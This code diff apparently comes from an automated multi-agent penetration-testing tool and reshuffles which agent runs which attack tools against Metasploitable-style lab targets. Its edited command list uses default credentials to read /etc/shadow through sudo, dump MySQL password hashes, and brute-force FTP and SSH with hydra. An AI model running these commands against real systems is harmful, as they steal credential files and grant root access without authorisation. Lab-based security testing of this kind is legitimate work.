@@ -246,19 +246,23 @@ class SmartCoach:
         },
         "OrionAgent": {
             "role": "strategic",
-            "description": "🎯 Strategic Coordination - web scanning, comprehensive analysis",
+            "description": "🎯 Strategic Coordination - service analysis, comprehensive recon",
             "primary_phases": [AttackPhase.ENUMERATION, AttackPhase.EXPLOITATION],
             "preferred_commands": [
-                # EXCLUSIVE to Orion - Web scanning and strategy
-                "gobuster_dir", "gobuster_vhost", "gobuster_dns",
-                "ffuf_fuzz", "ffuf_vhost", "wfuzz_dir", "dirb", "dirsearch",
-                "feroxbuster",
+                # Phase 8.2 Batch 14: Service-based commands (NOT HTTP-dependent)
+                # Orion is a strategist — focuses on service exploitation, not dir brute-force
+                "nmap_vuln_scan", "nmap_aggressive",
+                "searchsploit_search", "msfconsole_search",
                 # LDAP/AD - Orion ONLY
                 "ldapsearch_base", "bloodhound_collection", "kerbrute", "windapsearch",
+                # MS2/MS3 exploitation targets
+                "ssh_login", "telnet_1524", "mysql_root_login",
+                "samba_exploit", "vsftpd_exploit", "psql_default_creds",
             ],
-            "command_tags": {"comprehensive", "web", "analysis", "directory", "ldap"},
-            "avoid_tags": {"defense", "smb", "recon", "stealth", "scanning"},
-            "exclusive_prefixes": ["gobuster", "ffuf", "wfuzz", "dirb", "dirsearch", "feroxbuster", "ldap", "bloodhound", "kerb", "burp", "windap"],
+            "command_tags": {"comprehensive", "analysis", "directory", "ldap", "vuln"},
+            "avoid_tags": {"defense", "stealth", "scanning"},
+            # Phase 8.2 Batch 14: Removed gobuster/ffuf/feroxbuster/dirsearch from Orion
+            "exclusive_prefixes": ["ldap", "bloodhound", "kerb", "burp", "windap"],
             "is_coordinator": True,
         },
         "ShadowAgent": {
@@ -1894,12 +1898,13 @@ class SmartCoach:
             ],
             "offensive": [
                 # Phase 8.1 B7: Exploit-path priority commands first
+                # Phase 8.2 Batch 13: ALL sshpass variants use sudo to ensure uid=0(root) in output
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow'",
                 f"mysql -h {target} -u root -psploitme -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
                 f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S id'",
                 f"mysql -h {target} -u root -psploitme -e 'show databases' 2>/dev/null",
-                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'id; cat /etc/shadow'",
-                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'sudo -S id <<< msfadmin'",
+                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow; echo msfadmin | sudo -S id'",
+                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S whoami; echo msfadmin | sudo -S id'",
                 f"hydra -l msfadmin -p msfadmin ftp://{target} -t 4",
                 f"hydra -l msfadmin -p msfadmin ssh://{target} -t 4",
                 f"enum4linux -a {target}",
@@ -3226,6 +3231,7 @@ class SmartCoach:
             _discovered = ctx.discoveries.get("open_port", set()) if ctx.discoveries else set()
             _flags = ctx.state_flags if ctx.state_flags else {}
             _has_http = ("80" in _discovered or "8080" in _discovered
+                         or _flags.get("http_service_found", False)
                          or _flags.get("http_found", False))
             if not _has_http:
                 _HTTP_TOOLS = {"gobuster", "feroxbuster", "dirsearch", "nikto",
